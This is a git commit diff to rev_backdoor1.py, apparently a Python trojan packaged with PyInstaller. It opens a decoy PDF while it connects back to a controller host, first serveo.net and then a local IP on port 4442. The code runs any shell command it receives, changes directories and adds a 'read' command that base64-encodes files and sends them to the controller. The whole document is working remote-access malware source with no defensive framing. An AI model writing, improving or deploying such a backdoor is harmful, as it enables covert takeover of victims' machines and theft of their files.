270a2fde7c77ca3878d38e99d096a32eec434e40
TEJ PRAKASH AGARWAL <49359890+Tej4401@users.noreply.github.com>
2019-11-06 02:23:10 +0530

    Update rev_backdoor1.py

--- rev_backdoor1.py
+++ rev_backdoor1.py
@@ -1,16 +1,12 @@
-import socket, subprocess, os, sys, tkinter
+import socket, subprocess, os, sys, base64
 file_name = sys._MEIPASS + "\Kreyszig.pdf"
-subprocess.Popen(file_name, shell=false)
-def cd1(path):
-    os.chdir(path)
-    msg = os.getcwd()
-    return msg
+subprocess.Popen(file_name, shell=True)
 def execute(command):
     DEVNULL = open(os.devnull, 'wb')
     return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
-    connection.connect(("serveo.net", 4442))
+    connection.connect(("192.168.43.201", 4442))
 except socket.error:
     pass
 else:
@@ -19,18 +15,30 @@ else:
         rcvd = (connection.recv(1024)).decode()
         if rcvd != "quit":
             try:
+                check1=[]
                 check=rcvd.split(" ")
-                if check[0] == "cd":
-                    # res=(check[1]).encode()
-                    DEVNULL = open(os.devnull, 'wb')
-                    n=os.chdir(check[1],stderr=DEVNULL, stdin=DEVNULL)
+                if check[0] == "cd" and len(check)>1:
+                    check1=check.copy()
+                    check1.pop(0)
+                    path = ' '.join(check1)
+                    os.chdir(path.strip())
                     res = (os.getcwd()).encode()
-                    # res=check[1].encode()
-                else:
+                elif check[0] == "read" and len(check)>1:
+                    check1=check.copy()
+                    check1.pop(0)
+                    path = ' '.join(check1)
+                    if path[-3:]=="txt":
+                        with open(path.strip(),"rb") as file:
+                            res = file.read()
+                    else:
+                        with open(path.strip(),"rb") as file:
+                            res = base64.encodestring(file.read())
+                else:    
                     res = execute(rcvd)
             except:
+                res = ("[+] unable to execute command").encode()
                 pass
-            else:
-                connection.send(res)                            
+            connection.send(("\nnext output: \n").encode())
+            connection.send(res)                            
     connection.close()
     sys.exit(0)
